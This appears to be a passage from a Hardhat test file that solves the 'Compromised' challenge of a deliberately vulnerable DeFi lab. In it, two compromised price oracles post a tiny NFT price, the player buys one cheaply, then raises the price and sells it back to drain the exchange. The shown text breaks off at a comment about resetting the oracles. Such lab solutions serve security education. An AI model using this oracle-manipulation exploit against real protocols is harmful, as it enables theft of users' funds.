...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        // Post new prices with compromised oracles to buy cheap
        const CHEAP_PRICE = 1n * 10n ** 16n
        await oracle.connect(oracle1).postPrice("DVNFT", CHEAP_PRICE);
        await oracle.connect(oracle2).postPrice("DVNFT", CHEAP_PRICE);
        
        // Buy cheap
        await exchange.connect(player).buyOne({value: CHEAP_PRICE});

        await oracle.connect(oracle1).postPrice("DVNFT", CHEAP_PRICE + INITIAL_NFT_PRICE);
        await oracle.connect(oracle2).postPrice("DVNFT", CHEAP_PRICE + INITIAL_NFT_PRICE);
        
        // Approve and sell high
        await nftToken.connect(player).approve(exchange.address,0)
        await exchange.connect(player).sellOne(0)

        // set oracles back to price
